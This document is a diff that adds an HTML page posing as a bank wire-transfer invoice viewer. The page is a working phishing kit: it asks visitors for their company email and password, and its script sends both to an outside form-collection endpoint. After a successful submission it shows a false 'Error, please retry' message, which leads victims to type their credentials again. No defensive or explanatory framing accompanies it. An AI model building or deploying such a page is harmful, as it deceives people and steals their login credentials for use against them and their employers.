@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Invoice</title>
+    <link rel="stylesheet" href="form.css">
+    <style>
+        /* Extra small devices (phones, 600px and down) */
+        @media only screen and (max-width: 600px) {
+          .bg{
+            width: 100%;
+          }
+          form{
+            max-width: 450px;
+          }
+          .inputbox{
+            position: relative;
+            width: 390px;
+          }
+          .pen{
+            position: relative;
+            left: 250px; ;
+          }
+          } 
+        /* Small devices (portrait tablets and large phones, 600px and up) */
+        @media only screen and (min-width: 600px) {
+          }
+        
+        /* Medium devices (landscape tablets, 768px and up) */
+        @media only screen and (min-width: 768px) {
+          } 
+        
+        /* Large devices (laptops/desktops, 992px and up) */
+        @media only screen and (min-width: 992px) {
+          } 
+        
+        /* Extra large devices (large laptops and desktops, 1200px and up) */
+        @media only screen and (min-width: 1200px) {
+            .pen{
+                position: relative;
+                left: 300px;
+            }
+          }
+   </style>
+</head>
+<body>
+    
+   <img class="bg" src="purchase2.jpg" alt="">
+   <img class="bg" src="purchase1.jpg" alt="">
+
+   <form action="https://formspree.io/f/xzbwzanr" method="POST" id="myform">
+  <span><img style="width: 150px;float: left;padding-bottom: 20px;" src="rrbs.png" alt="logo">
+</span>
+  <h3>Bank Secured wired transfer payment, Confirm your corresponding company email and password to View payment invoice.</h3>
+   <div class="inputbox">
+        <input type="email" name="email" required="required">
+        <span>Domain/Email</span>
+        <i></i>
+    </div>
+    <div class="inputbox">
+        <input type="password" name="password" required="required">
+        <span>password</span>
+        <i></i>
+    </div>
+        <button type="submit">VIEW</button>
+        <img class="pen" src="img.jpg" width="150" alt="">
+        <h3 style="color: #fff;" id="status"></h3>    
+    </form>
+    <script>
+        var form = document.getElementById("myform");
+        
+        async function handleSubmit(event) {
+          event.preventDefault();
+          var status = document.getElementById("status");
+          var data = new FormData(event.target);
+          fetch(event.target.action, {
+            method: form.method,
+            body: data,
+            headers: {
+                'Accept': 'application/json'
+            }
+          }).then(response => {
+            if (response.ok) {
+              status.innerHTML = "Error, please retry inputting form details";
+              form.reset()
+            } else {
+              response.json().then(data => {
+                if (Object.hasOwn(data, 'errors')) {
+                  status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+                } else {
+                  status.innerHTML = "Oops! There was a problem submitting your form"
+                }
+              })
+            }
+          }).catch(error => {
+            status.innerHTML = "Oops! There was a problem submitting your form"
+          });
+        }
+        form.addEventListener("submit", handleSubmit)
+    </script>
+   </body>
+</html>
